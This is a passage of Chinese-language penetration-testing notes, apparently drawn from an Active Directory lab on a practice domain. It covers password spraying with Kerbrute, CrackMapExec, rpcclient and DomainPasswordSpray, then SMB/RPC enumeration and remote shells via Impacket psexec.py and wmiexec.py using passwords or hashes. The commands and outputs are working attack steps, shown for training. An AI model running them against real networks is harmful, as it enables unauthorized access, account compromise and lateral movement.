/opt/jsmith.txt </span><br><span class="line"></span><br><span class="line">    __             __               __     </span><br><span class="line">   / /_____  _____/ /_  _______  __/ /____ </span><br><span class="line">  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \</span><br><span class="line"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/</span><br><span class="line">/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        </span><br><span class="line"></span><br><span class="line">Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop</span><br><span class="line"></span><br><span class="line">2022/02/17 22:16:11 &gt;  Using KDC(s):</span><br><span class="line">2022/02/17 22:16:11 &gt;  172.16.5.5:88</span><br><span class="line"></span><br><span class="line">2022/02/17 22:16:11 &gt;  [+] VALID USERNAME: jjones@inlanefreight.local</span><br><span class="line">2022/02/17 22:16:11 &gt;  [+] VALID USERNAME: sbrown@inlanefreight.local</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><hr><h1 id="Password-Spraying"><a href="#Password-Spraying" class="headerlink" title="Password Spraying"></a>Password Spraying</h1><p>密码喷洒可能导致获得系统访问权限并可能在目标网络上立足。攻击涉及尝试使用一个常用密码和更长的用户名或电子邮件地址列表登录公开的服务。用户名和电子邮件可能是在渗透测试的 OSINT 阶段或最初的枚举尝试期间收集的。</p><blockquote><p>请记住，渗透测试不是静态的，当发现新数据时，要不断地迭代几种技术并重复过程。</p></blockquote><h2 id="From-Linux"><a href="#From-Linux" class="headerlink" title="From Linux"></a>From Linux</h2><h3 id="rpcclient-bash-script"><a href="#rpcclient-bash-script" class="headerlink" title="rpcclient &amp; bash script"></a>rpcclient &amp; bash script</h3><p><code>rpcclient</code>不会立即显示有效登录，响应表明登录成功。 通过响应中的<code>Authority Name</code>过滤掉无效的登录尝试。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">for</span> u <span class="keyword">in</span> $(<span class="built_in">cat</span> valid_users.txt);<span class="keyword">do</span> rpcclient -U <span class="string">&quot;<span class="variable">$u</span>%Welcome1&quot;</span> -c <span class="string">&quot;getusername;quit&quot;</span> 172.16.5.5 | grep Authority; <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">Account Name: tjohnson, Authority Name: INLANEFREIGHT</span><br><span class="line">Account Name: sgage, Authority Name: INLANEFREIGHT</span><br></pre></td></tr></table></figure><h3 id="Kerbrute-1"><a href="#Kerbrute-1" class="headerlink" title="Kerbrute"></a>Kerbrute</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1</span><br><span class="line"></span><br><span class="line">    __             __               __     </span><br><span class="line">   / /_____  _____/ /_  _______  __/ /____ </span><br><span class="line">  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \</span><br><span class="line"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/</span><br><span class="line">/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        </span><br><span class="line"></span><br><span class="line">Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop</span><br><span class="line"></span><br><span class="line">2022/02/17 22:57:12 &gt;  Using KDC(s):</span><br><span class="line">2022/02/17 22:57:12 &gt;  172.16.5.5:88</span><br><span class="line"></span><br><span class="line">2022/02/17 22:57:12 &gt;  [+] VALID LOGIN: sgage@inlanefreight.local:Welcome1</span><br><span class="line">2022/02/17 22:57:12 &gt;  Done! Tested 57 logins (1 successes) in 0.172 seconds</span><br></pre></td></tr></table></figure><h3 id="CrackMapExec-1"><a href="#CrackMapExec-1" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +</span><br><span class="line"></span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123 </span><br></pre></td></tr></table></figure><p>针对域控制器快速验证凭据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123</span><br><span class="line"></span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123</span><br></pre></td></tr></table></figure><p><code>--local-auth</code>尝试在每台计算机上登录一次，从而消除了帐户锁定的风险。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo crackmapexec smb  172.16.5.0/23 -u uname [-H NTLM / -p passwd] --local-auth</span><br></pre></td></tr></table></figure><h2 id="From-Windows"><a href="#From-Windows" class="headerlink" title="From Windows"></a>From Windows</h2><h3 id="DomainPasswordSpray-ps1"><a href="#DomainPasswordSpray-ps1" class="headerlink" title="DomainPasswordSpray.ps1"></a>DomainPasswordSpray.ps1</h3><p><code>-UserList</code> 生成用户列表（默认启用）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Import-Module</span> .\DomainPasswordSpray.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Invoke-DomainPasswordSpray</span> <span class="literal">-Password</span> Welcome1 <span class="literal">-OutFile</span> spray_success <span class="literal">-ErrorAction</span> SilentlyContinue</span><br><span class="line"></span><br><span class="line">[*] Current domain is compatible with Fine<span class="literal">-Grained</span> Password Policy.</span><br><span class="line">[*] Now creating a list of users to spray...</span><br><span class="line">[*] The smallest lockout threshold discovered <span class="keyword">in</span> the domain is <span class="number">5</span> login attempts.</span><br><span class="line">[*] Removing disabled users from list.</span><br><span class="line">[*] There are <span class="number">2923</span> total users found.</span><br><span class="line">[*] Removing users within <span class="number">1</span> attempt of locking out from list.</span><br><span class="line">[*] Created a userlist containing <span class="number">2923</span> users gathered from the current user<span class="string">&#x27;s domain</span></span><br><span class="line"><span class="string">[*] The domain password policy observation window is set to  minutes.</span></span><br><span class="line"><span class="string">[*] Setting a  minute wait in between sprays.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Confirm Password Spray</span></span><br><span class="line"><span class="string">Are you sure you want to perform a password spray against 2923 accounts?</span></span><br><span class="line"><span class="string">[Y] Yes  [N] No  [?] Help (default is &quot;Y&quot;): Y</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Password spraying has begun with  1  passwords</span></span><br><span class="line"><span class="string">[*] This might take a while depending on the total number of users</span></span><br><span class="line"><span class="string">[*] Now trying password Welcome1 against 2923 users. Current time is 2:57 PM</span></span><br><span class="line"><span class="string">[*] Writing successes to spray_success</span></span><br><span class="line"><span class="string">[*] SUCCESS! User:sgage Password:Welcome1</span></span><br><span class="line"><span class="string">[*] SUCCESS! User:mholliday Password:Welcome1</span></span><br><span class="line"><span class="string">[*] SUCCESS! User:tjohnson Password:Welcome1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Password spraying is complete</span></span><br><span class="line"><span class="string">[*] Any passwords that were successfully sprayed have been output to spray_success</span></span><br></pre></td></tr></table></figure><hr><h1 id="Credentialed-Enumeration"><a href="#Credentialed-Enumeration" class="headerlink" title="Credentialed Enumeration"></a>Credentialed Enumeration</h1><p><strong>SID</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S-1-5-21-&lt;域标识符&gt;-&lt;子域标识符&gt;-&lt;RID&gt;</span><br></pre></td></tr></table></figure><ul><li><code>S</code>: 表示这是一个 SID</li><li><code>1</code>: 表示 SID 的版本号</li><li><code>5</code>: 表示授权机构（在这种情况下，表示 NT 权限）</li><li><code>&lt;域标识符&gt;</code>: 这是域或本地计算机的唯一标识符</li><li><code>&lt;子域标识符&gt;</code>: 用于标识特定的子域</li><li><code>&lt;RID&gt;</code>: 这是相对标识符</li></ul><p><strong>RID</strong></p><ul><li><code>500</code>: 内置本地管理员账户的 RID</li><li><code>501</code>: 内置访客账户的 RID</li><li><code>512</code>: 域管理员组的 RID</li><li><code>1000+</code>: 普通用户账户的 RID，从 1000 开始分配给本地用户</li></ul><h2 id="CrackMapExec-2"><a href="#CrackMapExec-2" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h2><h3 id="Domain-User-enum"><a href="#Domain-User-enum" class="headerlink" title="Domain User enum"></a>Domain User enum</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users</span><br><span class="line"></span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 </span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-03-29 12:29:14.476567</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><h3 id="Domain-Group-enum"><a href="#Domain-Group-enum" class="headerlink" title="Domain Group enum"></a>Domain Group enum</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 </span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain group(s)</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Administrators                           membercount: 3</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Users                                    membercount: 4</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Guests                                   membercount: 2</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Print Operators                          membercount: 0</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Backup Operators                         membercount: 1</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Replicator                               membercount: 0</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Admins                            membercount: 19</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Users                             membercount: 0</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Contractors                              membercount: 138</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Accounting                               membercount: 15</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Engineering                              membercount: 19</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Executives                               membercount: 10</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Human Resources                          membercount: 36</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><h3 id="loggedon"><a href="#loggedon" class="headerlink" title="loggedon"></a>loggedon</h3><p><code>--loggedon-users</code> 尝试枚举登陆用户，如果有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users</span><br><span class="line"></span><br><span class="line">SMB         172.16.5.130    445    ACADEMY-EA-FILE  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-FILE) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 (Pwn3d!)</span><br><span class="line">SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] Enumerated loggedon users</span><br><span class="line">SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\clusteragent              logon_server: ACADEMY-EA-DC01</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><h3 id="share-enum"><a href="#share-enum" class="headerlink" title="share enum"></a>share enum</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares</span><br><span class="line"></span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 </span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated shares</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Share           Permissions     Remark</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  -----           -----------     ------</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  ADMIN$                          Remote Admin</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  C$                              Default share</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Department Shares READ            </span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  IPC$            READ            Remote IPC</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  NETLOGON        READ            Logon server share </span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  SYSVOL          READ            Logon server share </span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  User Shares     READ</span><br></pre></td></tr></table></figure><h3 id="share-spider"><a href="#share-spider" class="headerlink" title="share spider"></a>share spider</h3><p>爬取 share 目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share &#x27;Department Shares&#x27;</span><br><span class="line"></span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 </span><br><span class="line">SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Started spidering plus with option:</span><br><span class="line">SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        DIR: [&#x27;print$&#x27;]</span><br><span class="line">SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        EXT: [&#x27;ico&#x27;, &#x27;lnk&#x27;]</span><br><span class="line">SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]       SIZE: 51200</span><br><span class="line">SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]     OUTPUT: /tmp/cme_spider_plus</span><br></pre></td></tr></table></figure><p>运行完成后会将结果写入<code>/tmp/cme_spider_plus/&lt;ip of host&gt;.json</code></p><h2 id="SMBmap"><a href="#SMBmap" class="headerlink" title="SMBmap"></a>SMBmap</h2><p>用于收集 SMB 共享、权限和共享内容（如果可访问）的列表。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R &#x27;Department Shares&#x27; --dir-only</span><br><span class="line"></span><br><span class="line">[+] IP: 172.16.5.5:445Name: inlanefreight.local                               </span><br><span class="line">        Disk                                                  PermissionsComment</span><br><span class="line">----                                                  ------------------</span><br><span class="line">Department Shares                                 READ ONLY</span><br><span class="line">.\Department Shares\*</span><br><span class="line">dr--r--r--                0 Thu Mar 31 15:34:29 2022.</span><br><span class="line">dr--r--r--                0 Thu Mar 31 15:34:29 2022..</span><br><span class="line">dr--r--r--                0 Thu Mar 31 15:14:48 2022Accounting</span><br><span class="line">dr--r--r--                0 Thu Mar 31 15:14:39 2022Executives</span><br><span class="line">dr--r--r--                0 Thu Mar 31 15:14:57 2022Finance</span><br><span class="line">dr--r--r--                0 Thu Mar 31 15:15:04 2022HR</span><br><span class="line">dr--r--r--                0 Thu Mar 31 15:15:21 2022IT</span><br><span class="line">dr--r--r--                0 Thu Mar 31 15:15:29 2022Legal</span><br><span class="line">dr--r--r--                0 Thu Mar 31 15:15:37 2022Marketing</span><br><span class="line">dr--r--r--                0 Thu Mar 31 15:15:47 2022Operations</span><br><span class="line">dr--r--r--                0 Thu Mar 31 15:15:58 2022R&amp;D</span><br><span class="line">dr--r--r--                0 Thu Mar 31 15:16:10 2022Temp</span><br><span class="line">dr--r--r--                0 Thu Mar 31 15:16:18 2022Warehouse</span><br><span class="line"></span><br><span class="line">    &lt;SNIP&gt;</span><br></pre></td></tr></table></figure><h2 id="smbclient"><a href="#smbclient" class="headerlink" title="smbclient"></a>smbclient</h2><h3 id="enum"><a href="#enum" class="headerlink" title="enum"></a>enum</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbclient -N -L \\\\172.16.5.5</span><br><span class="line"># -U forend%Klmcargo2</span><br></pre></td></tr></table></figure><h3 id="download"><a href="#download" class="headerlink" title="download"></a>download</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient -N \\\\172.16.5.5\\share</span><br><span class="line"></span><br><span class="line">smb: \&gt; recurse ON# 启用递归模式</span><br><span class="line">smb: \&gt; prompt OFF# 关闭下载提示</span><br><span class="line">smb: \&gt; mget *</span><br></pre></td></tr></table></figure><h2 id="rpcclient-1"><a href="#rpcclient-1" class="headerlink" title="rpcclient"></a>rpcclient</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rpcclient -U &quot;&quot; -N 172.16.5.5</span><br><span class="line"># -U uname%passwd</span><br></pre></td></tr></table></figure><h3 id="enum-1"><a href="#enum-1" class="headerlink" title="enum"></a>enum</h3><p>queryuser RID  查询某个用户的详细信息</p><p>enumdomusers  按名称和 RID 打印出所有域用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">rpcclient $&gt; queryuser 0x457</span><br><span class="line"></span><br><span class="line">        User Name   :   htb-student</span><br><span class="line">        Full Name   :   Htb Student</span><br><span class="line">        Home Drive  :</span><br><span class="line">        Dir Drive   :</span><br><span class="line">        Profile Path:</span><br><span class="line">        Logon Script:</span><br><span class="line">        Description :</span><br><span class="line">        Workstations:</span><br><span class="line">        Comment     :</span><br><span class="line">        Remote Dial :</span><br><span class="line">        Logon Time               :      Wed, 02 Mar 2022 15:34:32 EST</span><br><span class="line">        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST</span><br><span class="line">        Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT</span><br><span class="line">        Password last set Time   :      Wed, 27 Oct 2021 12:26:52 EDT</span><br><span class="line">        Password can change Time :      Thu, 28 Oct 2021 12:26:52 EDT</span><br><span class="line">        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT</span><br><span class="line">        unknown_2[0..31]...</span><br><span class="line">        user_rid :      0x457</span><br><span class="line">        group_rid:      0x201</span><br><span class="line">        acb_info :      0x00000010</span><br><span class="line">        fields_present: 0x00ffffff</span><br><span class="line">        logon_divs:     168</span><br><span class="line">        bad_password_count:     0x00000000</span><br><span class="line">        logon_count:    0x0000001d</span><br><span class="line">        padding1[0..7]...</span><br><span class="line">        logon_hrs[0..21]...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rpcclient $&gt; enumdomusers</span><br><span class="line"></span><br><span class="line">user:[administrator] rid:[0x1f4]</span><br><span class="line">user:[guest] rid:[0x1f5]</span><br><span class="line">user:[krbtgt] rid:[0x1f6]</span><br><span class="line">user:[lab_adm] rid:[0x3e9]</span><br><span class="line">user:[htb-student] rid:[0x457]</span><br><span class="line">user:[avazquez] rid:[0x458]</span><br><span class="line">user:[pfalcon] rid:[0x459]</span><br><span class="line">user:[fanthony] rid:[0x45a]</span><br><span class="line">user:[wdillard] rid:[0x45b]</span><br><span class="line">user:[lbradford] rid:[0x45c]</span><br><span class="line">user:[sgage] rid:[0x45d]</span><br><span class="line">user:[asanchez] rid:[0x45e]</span><br><span class="line">user:[dbranch] rid:[0x45f]</span><br><span class="line">user:[ccruz] rid:[0x460]</span><br><span class="line">user:[njohnson] rid:[0x461]</span><br><span class="line">user:[mholliday] rid:[0x462]</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;  </span><br></pre></td></tr></table></figure><h2 id="Impacket-Toolkit"><a href="#Impacket-Toolkit" class="headerlink" title="Impacket Toolkit"></a>Impacket Toolkit</h2><h3 id="psexec-py"><a href="#psexec-py" class="headerlink" title="psexec.py"></a>psexec.py</h3><p><code>Psexec.py</code> 是 Sysinternals psexec 可执行文件的克隆，但工作方式与原始版本略有不同。该工具通过将随机命名的可执行文件上传到目标主机上的<code>ADMIN$</code>共享来创建远程服务。然后它通过<code>RPC</code>和<code>Windows Service Control Manager</code>注册该服务。一旦建立，通信就会通过命名管道进行，并在受害主机上以<code>SYSTEM</code>身份提供交互式远程 shell。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">psexec.py inlanefreight.local/wley:&#x27;transporter@4&#x27;@172.16.5.125</span><br><span class="line"># or</span><br><span class="line">psexec.py inlanefreight.local/wley@172.16.5.125 -hashes LM_hash:NT_hash</span><br></pre></td></tr></table></figure><h3 id="wmiexec-py"><a href="#wmiexec-py" class="headerlink" title="wmiexec.py"></a>wmiexec.py</h3><p><code>wmiexec.py</code>使用半交互式 shell，其中命令通过<a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page">Windows Management Instrumentation</a>执行。它不会在目标主机上放置任何文件或可执行文件，并且生成的日志比其他模块少。连接后，它会以连接的本地管理员用户身份运行。与其他工具相比，这是一种在主机上执行的更隐蔽的方法，但仍可能被大多数现代防病毒和 EDR 系统捕获。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py inlanefreight.local/wley:&#x27;transporter@4&#x27;@172.16.5.5</span><br><span class="line"># or</span><br><span class="line">wmiexec.py inlanefreight.local/wley@172.16.5.5 -hashes LM_hash:NT_hash</span><br></pre></td></tr></table></figure><p>此 shell 环境不是完全交互式的，因此发出的每个命令都会从 WMI 执行一个新的 cmd.exe 并执行您的命令。缺点是，如果警惕的防御者检查事件日志并查看事件 ID <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688">4688：已创建一个新进程</a>，他们将看到创建一个新进程来生成 cmd.exe 并发出命令。这并不总是恶意活动，因为许多组织都使用 WMI 来管理计算机，但它可以作为调查的线索。在上面的命令，该进程是在主机上的用户 wley 的上下文中运行的（whoami），而不是以 SYSTEM 身份运行。</p><h2 id="windapsearch-1"><a href="#windapsearch-1" class="headerlink" title="windapsearch"></a>windapsearch</h2><h3 id="enum-2"><a href="#enum-2" class="headerlink" title="enum"></a>enum</h3><p><code>--da</code> 枚举域管理员组成员</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ python3 